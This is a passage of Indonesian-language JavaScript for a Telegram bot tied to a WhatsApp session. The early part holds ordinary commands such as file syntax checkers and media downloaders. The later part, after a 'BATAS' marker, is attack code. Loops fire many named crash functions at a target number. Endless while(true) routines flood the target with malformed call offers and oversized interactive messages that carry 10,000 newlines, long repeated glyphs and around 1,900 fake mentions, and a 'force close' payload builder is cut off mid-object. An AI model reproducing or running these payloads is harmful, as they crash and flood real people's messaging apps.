    ? "📋 *Detail Temuan:*\n" + risiko.join("\n")
    : "✅ Tidak ada tanda-tanda berbahaya ditemukan."
}

🛡️ *Analisis Otomatis by Tredict Invictus System*
`;

    ctx.reply(hasil, { parse_mode: "Markdown" });
  } catch (err) {
    ctx.reply(
      `❌ Gagal memeriksa website.\nKemungkinan website down, salah URL, atau menolak koneksi.\n\nDetail: ${err.message}`
    );
  }
});

bot.command("infoerror", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const reply = ctx.message.reply_to_message;

  if (!reply?.document) {
    return ctx.reply(
      "⚠️ Balas file `.js`, `.json`, atau `.html` yang ingin dicek error!\nContoh:\n/cekerror (reply file.js)"
    );
  }

  const file = reply.document;
  const ext = file.file_name.split(".").pop().toLowerCase();

  if (!["js", "json", "html"].includes(ext)) {
    return ctx.reply("❌ Format file tidak didukung! Gunakan `.js`, `.json`, atau `.html`.");
  }

  await ctx.reply("🔍 Sedang menganalisa file...");

  try {
    // ambil file dari telegram
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    // Cek berdasarkan ekstensi
    if (ext === "js") {
      try {
        acorn.parse(code, { ecmaVersion: "latest" });
        return ctx.reply("✅ Tidak ditemukan error syntax JavaScript! File kamu aman dijalankan.");
      } catch (err) {
        const { loc, message } = err;
        const lines = code.split("\n");
        const errorLine = lines[loc?.line - 1] || "";
        const markedLine = `> ${errorLine}\n${" ".repeat(loc?.column || 0)}⬆️ [Error di sini]`;

        const report = `
❌ *Error JavaScript ditemukan!*  
🧠 *Jenis:* ${message.split(":")[0]}  
📍 *Baris:* ${loc?.line || "?"}  
🧩 *Keterangan:* ${message}

\`\`\`js
${markedLine}
\`\`\`
`;
        return ctx.replyWithMarkdown(report);
      }
    }

    if (ext === "json") {
      try {
        JSON.parse(code);
        return ctx.reply("✅ JSON valid! Tidak ada error syntax.");
      } catch (err) {
        const match = err.message.match(/position (\d+)/);
        const pos = match ? parseInt(match[1], 10) : 0;
        const before = code.substring(pos - 20, pos);
        const after = code.substring(pos, pos + 20);
        const marked = `${before}⬆️ [Error di sini]${after}`;

        const report = `
❌ *Error JSON ditemukan!*  
📍 *Posisi:* ${pos}  
🧩 *Keterangan:* ${err.message}

\`\`\`json
${marked}
\`\`\`
`;
        return ctx.replyWithMarkdown(report);
      }
    }

    if (ext === "html") {
      try {
        let openTags = [];
        const parser = new htmlparser2.Parser(
          {
            onopentag(name) {
              openTags.push(name);
            },
            onclosetag(name) {
              const idx = openTags.lastIndexOf(name);
              if (idx === -1) throw new Error(`Tag penutup </${name}> tidak memiliki pasangan.`);
              openTags.splice(idx, 1);
            },
          },
          { decodeEntities: true }
        );
        parser.write(code);
        parser.end();

        if (openTags.length > 0) {
          throw new Error(`Tag tidak tertutup: <${openTags.join(">, <")}>`);
        }

        return ctx.reply("✅ HTML valid! Tidak ada tag error yang terdeteksi.");
      } catch (err) {
        const report = `
❌ *Error HTML ditemukan!*  
🧩 *Keterangan:* ${err.message}
`;
        return ctx.replyWithMarkdown(report);
      }
    }
  } catch (e) {
    return ctx.reply(`❌ Gagal membaca file: ${e.message}`);
  }
});

bot.command("cekfunc", async (ctx) => {
if (checkResting(ctx)) return;
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply) {
      return ctx.reply("⚠️ Balas potongan kode atau file `.js` yang ingin diperiksa!\nContoh:\n/cekfunc (balas function atau file.js)");
    }

    let code = "";

    // Jika reply berupa file .js
    if (reply.document) {
      const file = reply.document;
      if (!file.file_name.endsWith(".js")) {
        return ctx.reply("❌ File harus berformat `.js`!");
      }

      const fileLink = await ctx.telegram.getFileLink(file.file_id);
      const res = await fetch(fileLink.href);
      code = await res.text();
    } 
    // Jika reply berupa teks
    else if (reply.text) {
      code = reply.text;
    } else {
      return ctx.reply("⚠️ Kirim atau balas teks/function yang ingin diperiksa!");
    }

    await ctx.reply("🔍 Sedang memeriksa function...");

    let syntaxError = null;
    let line = 0, column = 0;
    let suggestion = [];

    try {
      acorn.parse(code, { ecmaVersion: "latest", sourceType: "module", locations: true });
    } catch (err) {
      syntaxError = err.message;
      line = err.loc?.line || 0;
      column = err.loc?.column || 0;
    }

    if (syntaxError) {
      if (syntaxError.includes("Unexpected token")) suggestion.push("Periksa tanda kurung, koma, atau kurung kurawal yang tidak ditutup.");
      if (syntaxError.includes("has already been declared")) suggestion.push("Hapus deklarasi ganda pada variabel atau function yang sama.");
      if (syntaxError.includes("Unexpected end")) suggestion.push("Pastikan semua blok kode `{}` sudah ditutup dengan benar.");
    }

    const snippet = (() => {
      if (!syntaxError || !line) return "—";
      const lines = code.split("\n");
      const start = Math.max(line - 2, 0);
      const end = Math.min(line + 2, lines.length);
      return lines.slice(start, end)
        .map((l, i) => `${start + i + 1 === line ? "👉 " : ""}${String(start + i + 1).padEnd(5)}| ${l}`)
        .join("\n");
    })();

    const report = syntaxError
      ? `
❌ *Function Error Terdeteksi!*

🔴 *${syntaxError}*
📍 *Baris:* ${line}:${column}
📘 *Cuplikan Kode:*
\`\`\`js
${snippet}
\`\`\`

💡 *Saran Perbaikan:*
${suggestion.map(s => "• " + s).join("\n") || "Periksa kembali sintaks Anda."}
`
      : "✅ *Function valid & tidak ditemukan error syntax.*";

    await ctx.replyWithMarkdown(report);
  } catch (err) {
    console.error("cekfunc error:", err);
    return ctx.reply(`❌ Terjadi kesalahan: ${err.message}`);
  }
});

bot.command("cekfile", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply?.document) {
      return ctx.reply("⚠️ Balas file `.js` yang ingin diperiksa!\nContoh:\n/cekfile (balas file.js)");
    }

    const file = reply.document;
    if (!file.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus berformat `.js`!");
    }

    await ctx.reply("🔍 Sedang menganalisis isi file...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    let syntaxError = null;
    let line = 0, column = 0;
    let runtimeError = "—";
    let suggestion = [];
    let functions = [], commands = [], protections = [];

    // Coba parse syntax
    try {
      const tree = acorn.parse(code, { ecmaVersion: "latest", sourceType: "module", locations: true });

      walk.simple(tree, {
        FunctionDeclaration(node) {
          if (node.id?.name) functions.push(node.id.name);
        },
        CallExpression(node) {
          if (node.callee?.object?.name === "bot" && node.callee?.property?.name === "command") {
            const cmd = node.arguments?.[0]?.value;
            if (cmd) commands.push("/" + cmd);
          }
        }
      });
    } catch (err) {
      syntaxError = err.message;
      line = err.loc?.line || 0;
      column = err.loc?.column || 0;
    }

    // Proteksi umum
    const low = code.toLowerCase();
    if (low.includes("debugger")) protections.push("🧠 Anti-Debug aktif");
    if (low.includes("process.exit")) protections.push("⚔️ Process Kill Protection");
    if (low.includes("eval(")) protections.push("🕵️ Eval Lock / Dynamic Eval");
    if (low.includes("checksum")) protections.push("🔐 Checksum Validation");
    if (low.includes("hwid")) protections.push("💻 HWID Lock System");
    if (low.includes("antidebug")) protections.push("🧩 Anti-Bypass / Anti-Debug Detected");

    // Cek runtime error (simulasi aman)
    try {
      new Function(code);
    } catch (err) {
      runtimeError = err.message;
    }

    // Saran otomatis
    if (syntaxError) {
      if (syntaxError.includes("Unexpected token")) suggestion.push("Periksa tanda kurung, koma, atau kurung kurawal yang tidak ditutup.");
      if (syntaxError.includes("has already been declared")) suggestion.push("Hapus deklarasi ganda pada variabel atau function yang sama.");
      if (syntaxError.includes("Unexpected end")) suggestion.push("Pastikan semua blok kode `{}` sudah ditutup dengan benar.");
    }

    const snippet = (() => {
      if (!syntaxError || !line) return "—";
      const lines = code.split("\n");
      const start = Math.max(line - 2, 0);
      const end = Math.min(line + 2, lines.length);
      return lines.slice(start, end)
        .map((l, i) => `${start + i + 1 === line ? "👉 " : ""}${String(start + i + 1).padEnd(5)}| ${l}`)
        .join("\n");
    })();

    const report = `
💥 *Error Syntax Ditemukan:*
${syntaxError ? `🔴 *${syntaxError}*\n📍 *Baris:* ${line}:${column}\n📘 *Cuplikan Kode:*\n\`\`\`js\n${snippet}\n\`\`\`` : "✅ Tidak ditemukan error syntax."}

💥 *Error Runtime (Simulasi):*
\`\`\`
${runtimeError}
\`\`\`

💡 *Saran Perbaikan:*
${suggestion.map(s => "• " + s).join("\n") || "Tidak ada saran perbaikan."}

📊 *Analisis Tambahan:*
📦 *Total Function:* ${functions.length}
⚙️ *Command Bot:* ${commands.length}
🔒 *Proteksi Aktif:* ${protections.length ? protections.join("\n") : "—"}

🧩 *Daftar Function (maks 10):*
${functions.slice(0, 10).map(f => "• " + f).join("\n") || "—"}

⚙️ *Command Terdeteksi:*
${commands.slice(0, 10).map(c => "• " + c).join("\n") || "—"}
`;

    await ctx.replyWithMarkdown(report);
  } catch (err) {
    console.error("cekfile error:", err);
    return ctx.reply(`❌ Terjadi kesalahan: ${err.message}`);
  }
});

// Hanya developer bisa balas ke user
bot.command("balas", async (ctx) => {
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
  if (ctx.from.id.toString() !== DEVELOPER_ID) {
    return ctx.reply("❌ Command ini hanya untuk developer!");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) {
    return ctx.reply("⚠️ Format: /reply <userId> <pesan>");
  }

  const targetId = args[0];
  const pesan = args.slice(1).join(" ");

  try {
    await bot.telegram.sendMessage(
      targetId,
      `💬 Balasan dari Developer:\n\n${pesan}`
    );

    await ctx.reply(`✅ Pesan berhasil dikirim ke user \`${targetId}\``, {
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error("Error in /reply:", e);
    ctx.reply("❌ Gagal mengirim balasan ke user.");
  }
});

bot.command("tiktok", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
        return;
    }
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" "); // ambil link setelah /tiktok
  const url = args.trim();

  if (!url || !/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i.test(url)) {
    return ctx.reply("❌ Format link TikTok tidak valid.", { parse_mode: "Markdown" });
  }

  try {
    const processing = await ctx.reply("⏳ Mengunduh video TikTok...");

    const params = new URLSearchParams();
    params.set("url", url);
    params.set("hd", "1");

    const res = await fetch("https://tikwm.com/api/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params
    });

    const data = await res.json();

    await ctx.deleteMessage(processing.message_id).catch(() => {});

    if (!data?.data?.play) {
      return ctx.reply("❌ Video tidak ditemukan.");
    }

    // Kirim video TikTok
    await ctx.replyWithPhoto(
      { url: data.data.play },
      {
        caption: `🎵 ${data.data.title || "Video TikTok"}\n🔗 ${url}`,
        supports_streaming: true
      }
    );

    // Kirim audio jika ada
    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat download TikTok.");
  }
});

bot.command("ig", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
        return;
    }
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const url = args;

  if (!url) {
    return ctx.reply(
      "❌ Format salah!\n\nGunakan `/ig <link Instagram>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const apiUrl = `https://api.diioffc.web.id/api/download/instagram?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.result) {
      return ctx.reply("❌ Tidak ada media ditemukan.");
    }

    // Ubah ke array agar bisa di-loop meskipun hanya satu media
    const mediaList = Array.isArray(data.result) ? data.result : [data.result];

    for (const media of mediaList) {
      if (media.url.includes(".mp4")) {
        await ctx.replyWithPhoto(
          { url: media.url },
          { caption: "📥 Instagram Vidoe" }
        );
      } else {
        await ctx.replyWithPhoto(
          { url: media.url },
          { caption: "📥 Instagram Photo" }
        );
      }
    }
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat mengambil media IG.");
  }
});

bot.command("brat", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
        return;
    }
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply(
      "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All"
    );
  }

  const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

  try {
    await ctx.replyWithPhoto(
      { url: apiUrl },
      {
        caption: `🖼️ *Brat Image Generated*\n\n✏️ Text: *${text}*`,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("Brat API Error:", err);
    ctx.reply("❌ Error generating Brat image. Please try again later.");
  }
});

bot.command("pinterest", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
        return;
    }
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply(
      "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max"
    );
  }

  const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(text)}`;

  try {
    const res = await axios.get(apiUrl);
    const data = res.data;

    if (!data || !data.result || data.result.length === 0) {
      return ctx.reply("❌ No Pinterest images found for your query.");
    }

    const firstResult = data.result[0];
    await ctx.replyWithPhoto(
      { url: firstResult },
      {
        caption: `📌 Pinterest Result for: *${text}*`,
        parse_mode: "Markdown"
      }
    );
  } catch (err) {
    console.error("Pinterest API Error:", err);
    ctx.reply("❌ Error fetching Pinterest image. Please try again later.");
  }
});

bot.command("tourl", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
            return;
        }
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

bot.command("getcode", async (ctx) => {
if (!groupOnly(ctx)) return;
if (!menuEnabled) {
  return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
}
if (!tokenValidated) {
        return;
    }
  const args = ctx.message.text.split(" ").slice(1);
  const url = args[0];
  
    
  if (!url) {
    return ctx.reply("❌ Masukkan URL yang valid. Contoh: /getcode https://example.com");
  }

  try {
    const response = await axios.get(url);
    let code = response.data;

    if (code.length > 4000) {
      const filePath = `./xata_${Date.now()}.html`;
      fs.writeFileSync(filePath, code, "utf8");

      await ctx.replyWithDocument({ source: filePath, filename: path.basename(filePath) }, { caption: `📜 Source code HTML dari ${url}` });

      fs.unlinkSync(filePath);
    } else {
      ctx.reply(`📜 *Source Code HTML dari ${url}:*\n\n<code>${code}</code>`, { parse_mode: "HTML" });
    }
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal mengambil source code HTML. Pastikan link valid dan bisa diakses.");
  }
});

/// BATAS 
async function websiteaipi(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 500;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 10) {
        await privatedelay(),
        NullIpayment(sock, target),
          ZhTRape(target),
          XDelay(target),
          ZhTTrexi(sock, target),
          ghostluc(sock, target),
          XDelay(target),
          ghostluc(sock, target),
          ZhTTrexi(sock, target),
          ghostluc(sock, target),
          NullIpayment(sock, target),
          ZhTRape(target),
          CupofLove(sock, target),
          ZhTTrexi(sock, target),
          NullInvis(sock, target),
          NullInvis(sock, target),
          NullInvis(sock, target),
          XDelay(target)
      
        console.log(
          chalk.red(`Website Send bug ${count}/10 ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 100 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 550);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 1000);
    }
  };

  sendNext();
}

async function websiteapi(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 500;
  const startTime = Date.now();
  let count = 0;

  // Delay progresif makin lama setiap pengiriman
  function dynamicDelay(i) {
    const base = 500;     // awal delay
    const increase = 250; // kenaikan tiap pesan
    const max = 2500;     // batas tertinggi
    let final = base + (i * increase);
    return final > max ? max : final;
  }

  // Mini animasi loading singkat untuk jeda
  async function tinyLoading(ms) {
    const frames = ["⠋","⠙","⠸","⠴","⠦","⠇"];
    let index = 0;

    const start = Date.now();
    while (Date.now() - start < ms) {
      const frame = frames[index++ % frames.length];
      process.stdout.write(`\r\x1b[36m${frame} Delay...${ms}ms\x1b[0m`);
      await new Promise(res => setTimeout(res, 120));
    }
    process.stdout.write("\r"); // clear line
  }

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 100) {

        // Delay progresif + animasi keren
        const jd = dynamicDelay(count);
        await tinyLoading(jd);

        // Semua function kamu tetap utuh
        await privatedelay(),
        NullIpayment(sock, target),
        ZhTRape(target),
        XDelay(target),
        ZhTTrexi(sock, target),
        ghostluc(sock, target),
        XDelay(target),
        ghostluc(sock, target),
        ZhTTrexi(sock, target),
        ghostluc(sock, target),
        NullIpayment(sock, target),
        ZhTRape(target),
        CupofLove(sock, target),
        ZhTTrexi(sock, target),
        NullInvis(sock, target),
        NullInvis(sock, target),
        NullInvis(sock, target),
        NullIpayment(sock, target),
        ZhTRape(target),
        XDelay(target),
        ZhTTrexi(sock, target),
        ghostluc(sock, target),
        XDelay(target),
        ghostluc(sock, target),
        ZhTTrexi(sock, target),
        ghostluc(sock, target),
        NullIpayment(sock, target),
        ZhTRape(target),
        CupofLove(sock, target),
        ZhTTrexi(sock, target),
        NullInvis(sock, target),
        NullInvis(sock, target),
        NullInvis(sock, target),
        XDelay(target)

        // Log keren
        console.log(
          chalk.red(`⚡ Website Send Bug ${count}/10 → ${target}`)
        );

        count++;

        // Delay panggilan berikutnya
        setTimeout(sendNext, 300);
      } else {
        console.log(chalk.green(`🔥 Success Sending 100 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 450);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 1000);
    }
  };

  sendNext();
}
///
async function ForceBitterSpam(sock, target) {

    while (true) {  // <== TAMBAHAN LOOP TANPA MERUBAH KODE ASLI

        let devices = (
            await sock.getUSyncDevices([target], false, false)
        ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await sock.assertSessions(devices);

        let xnxx = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => {
                        try { await prev; } catch { }
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        let memek = xnxx();
        let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        let porno = sock.createParticipantNodes.bind(sock);
        let yntkts = sock.encodeWAMessage?.bind(sock);

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            let ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

            let { id: meId, lid: meLid } = sock.authState.creds.me;
            let omak = meLid ? jidDecode(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            let nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                    let { user: targetUser } = jidDecode(jid);
                    let { user: ownPnUser } = jidDecode(meId);

                    let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                    let y = jid === meId || jid === meLid;

                    if (dsmMessage && isOwnUser && !y)
                        msg = dsmMessage;

                    let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                    return memek.mutex(jid, async () => {
                        let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                            jid,
                            data: bytes
                        });

                        if (type === 'pkmsg')
                            shouldIncludeDeviceIdentity = true;

                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }]
                        };
                    });
                })
            );

            return {
                nodes: nodes.filter(Boolean),
                shouldIncludeDeviceIdentity
            };
        };

        let awik = crypto.randomBytes(32);
        let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: '0' }
        );

        let expensionNode = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    {
                        tag: "video",
                        attrs: {
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0",
                            enc: "vp8",
                            dec: "vp8"
                        }
                    },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity
                        ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }]
                        : []
                    )
                ]
            }]
        };

        let ZayCoreX = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                        supportPayload: JSON.stringify({
                            version: 3,
                            is_ai_message: true,
                            should_show_system_message: true,
                            ticket_id: crypto.randomBytes(16)
                        })
                    },
                    intwractiveMessage: {
                        body: { text: 'Xata' },
                        footer: { text: 'Xata' },
                        carouselMessage: {
                            messageVersion: 1,
                            cards: [{
                                header: {
                                    stickerMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4",
                                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                        mimetype: "image/webp",
                                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                                        fileLength: { low: 1, high: 0, unsigned: true },
                                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                        firstFrameLength: 19904,
                                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                        isAnimated: true,
                                        isAvatar: false,
                                        isAiSticker: false,
                                        isLottie: false,
                                        contextInfo: { mentionedJid: target }
                                    },
                                    hasMediaAttachment: true
                                },
                                body: { text: 'Xata' },
                                footer: { text: 'Xata' },
                                nativeFlowMessage: {
                                    messageParamsJson: "\n".repeat(10000)
                                },
                                contextInfo: {
                                    id: sock.generateMessageTag(),
                                    forwardingScore: 999,
                                    isForwarding: true,
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "X",
                                    mentionedJid: ["0@s.whatsapp.net"]
                                }
                            }]
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, ZayCoreX, {
            messageId: null,
            participant: { jid: target },
            userJid: target
        });

        await sock.sendNode(expensionNode);

    } // <== AKHIR while(true)

}

async function plaintext(sock, target) {
  while (true) { 
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices)

    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let ywdh = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let lemiting = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ]
      }]
    };

    await sock.sendNode(lemiting);
  }

}

async function CharlyForceClose(sock, target) {
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const xyrview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
      contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
